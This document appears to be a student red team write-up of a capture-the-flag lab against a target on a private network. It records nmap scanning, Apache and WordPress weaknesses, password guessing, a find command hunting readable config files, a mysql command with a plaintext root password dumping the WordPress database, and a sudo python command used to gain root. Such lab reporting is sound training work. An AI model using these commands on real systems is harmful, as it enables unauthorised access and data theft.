# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.0/24
```

* ![image-20211130104421641](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130104421641.png)

This scan identifies the services below as potential points of entry:

- Target1 192.168.1.110 points of entry
  - port 80, 22, 111, 139 and 445
  - services httpd, ssh 

The following vulnerabilities were identified on each target:

**Target 1: identify apache version vulnerability**

- CVE-2014-8109 
- CVE-2015-3185
- Severity High

![image-20211130105727457](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130105727457.png)

**Target 1:  identify password policy**

* Exposure of password policy
* Severity High

![image-20211130113000527](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130113000527.png)

**Target 1: identify wordpress user enumeration vulnerability**

* User enumeration
* Severity medium

![image-20211130112805953](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130112805953.png)

**Target 1:  identify mysql vulnerability**

* Database name and root user password
* Severity High

![image-20211130112853185](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130112853185.png)



### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: 
  - ![image-20211130110452430](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130110452430.png)
    - **Exploit Used**
      - simple password guessing
      - michael
  - `flag2.txt`: 
  - ![image-20211130110330424](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130110330424.png)
    - **Exploit Used**
      - probing scope of user authority 
      - find / -perm -o=r | grep config
  - `flag3.txt:`
  - ![image-20211130112541115](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130112541115.png)
    - **Exploit Used**
      - theft of database root password 
      - mysql -u root -pR@v3nSecurity -D wordpress -e "select * from *"
  - `flag4.txt:`
  - ![image-20211130111550882](C:\Users\robforee\AppData\Roaming\Typora\typora-user-images\image-20211130111550882.png)
    - **Exploit Used**
      - sudo root
      - sudo python -c "import os;os.system('cat /root/flag4.txt');"

